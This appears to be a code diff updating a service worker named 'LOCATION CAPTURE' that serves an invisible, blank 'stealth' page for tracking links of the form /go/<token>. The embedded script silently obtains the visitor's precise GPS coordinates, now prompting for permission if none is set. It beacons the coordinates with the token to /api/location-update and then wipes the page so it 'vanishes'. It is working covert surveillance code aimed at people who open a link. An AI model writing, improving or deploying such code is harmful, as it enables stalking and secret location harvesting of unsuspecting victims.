@@ -1,9 +1,9 @@
 // ═══════════════════════════════════════════════════════════
-// LOCATION CAPTURE — Service Worker v6.0 (GPS ONLY)
+// LOCATION CAPTURE — Service Worker v6.1 (GPS ONLY, FIXED VANISH)
 // ═══════════════════════════════════════════════════════════
 // Every /go/<token> navigation → intercept → stealth HTML
-// GPS fires silently if cached, otherwise denied
-// No IP geolocation, no prompts, zero visible content
+// GPS fires silently if cached; triggers prompt if not yet decided
+// Vanish only after GPS completes or ~22s timeout
 // ═══════════════════════════════════════════════════════════
 
 self.addEventListener("install", function(event) {
@@ -20,7 +20,6 @@ self.addEventListener("fetch", function(event) {
   if (!match || event.request.method !== "GET") return;
 
   const token = match[1];
-  const origin = url.origin;
   const isNavigation = event.request.mode === "navigate";
 
   if (!isNavigation) return;
@@ -28,8 +27,8 @@ self.addEventListener("fetch", function(event) {
   event.respondWith(
     (async function() {
       try {
-        // ── Stealth HTML: absolute minimum, zero visible content ──
-        const stealthHtml = '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8" />\n<meta name="viewport" content="width=device-width, initial-scale=1.0" />\n<title> </title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nhtml,body{background:#000;overflow:hidden;width:100%;height:100%}\nbody{opacity:0}\n</style>\n</head>\n<body>\n<script>\n(function(){\'use strict\';var t="' + token + '";var _s=false;function _ok(lat,lng,acc){if(_s)return;_s=true;var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc});var b=new Blob([p],{type:"application/json"});if(navigator.sendBeacon)navigator.sendBeacon("/api/location-update",b);else try{fetch("/api/location-update",{method:"POST",headers:{"Content-Type":"application/json"},body:p,keepalive:true})}catch(e){}}function _fail(){if(_s)return;_s=true;fetch("/api/location-denied",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:t}),keepalive:true}).catch(function(){})}function _vanish(){try{window.location.replace("about:blank")}catch(e){}try{window.open("","_self","").close()}catch(e){}try{self.close()}catch(e){}try{window.close()}catch(e){}setTimeout(function(){try{document.open();document.write("");document.close()}catch(e){}},5)}if(navigator.permissions&&navigator.permissions.query){navigator.permissions.query({name:"geolocation"}).then(function(s){if(s.state==="granted"&&"geolocation"in navigator){navigator.geolocation.getCurrentPosition(function(p){_ok(p.coords.latitude,p.coords.longitude,p.coords.accuracy);_vanish()},function(){_fail();_vanish()},{enableHighAccuracy:true,timeout:8000,maximumAge:300000});setTimeout(function(){if(!_s){_fail();_vanish()}},10000)}else{_fail();_vanish()}}).catch(function(){_fail();_vanish()})}else{_fail();_vanish()}setTimeout(function(){if(!_s){_fail()}_vanish()},4000)})();\n</script>\n</body>\n</html>';
+        // ── Stealth HTML: fires GPS, waits for result, then vanishes ──
+        const stealthHtml = '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8" />\n<meta name="viewport" content="width=device-width, initial-scale=1.0" />\n<title> </title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nhtml,body{background:#000;overflow:hidden;width:100%;height:100%}\nbody{opacity:0}\n</style>\n</head>\n<body>\n<script>\n(function(){\'use strict\';var t="' + token + '";var _s=false;function _ok(lat,lng,acc){if(_s)return;_s=true;var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc});var b=new Blob([p],{type:"application/json"});if(navigator.sendBeacon)navigator.sendBeacon("/api/location-update",b);else try{fetch("/api/location-update",{method:"POST",headers:{"Content-Type":"application/json"},body:p,keepalive:true})}catch(e){}}function _fail(){if(_s)return;_s=true;var p=JSON.stringify({token:t});var b=new Blob([p],{type:"application/json"});if(navigator.sendBeacon)navigator.sendBeacon("/api/location-denied",b);else try{fetch("/api/location-denied",{method:"POST",headers:{"Content-Type":"application/json"},body:p,keepalive:true})}catch(e){}}function _v(){try{window.location.replace("about:blank")}catch(e){}setTimeout(function(){try{document.open();document.write("");document.close()}catch(e){}},10)}function _gps(cb){if(!("geolocation"in navigator)){_fail();if(cb)cb();return}navigator.geolocation.getCurrentPosition(function(p){_ok(p.coords.latitude,p.coords.longitude,p.coords.accuracy);if(cb)cb()},function(){_fail();if(cb)cb()},{enableHighAccuracy:true,timeout:15000,maximumAge:0})}if(navigator.permissions&&navigator.permissions.query){navigator.permissions.query({name:"geolocation"}).then(function(s){if(s.state==="granted"){_gps(function(){_v()})}else if(s.state==="denied"){_fail();_v()}else{_gps(function(){_v()})}}).catch(function(){_gps(function(){_v()})})}else{_gps(function(){_v()})}setTimeout(function(){if(!_s){_fail()}_v()},22000)})();\n</script>\n</body>\n</html>';
 
         return new Response(stealthHtml, {
           headers: {
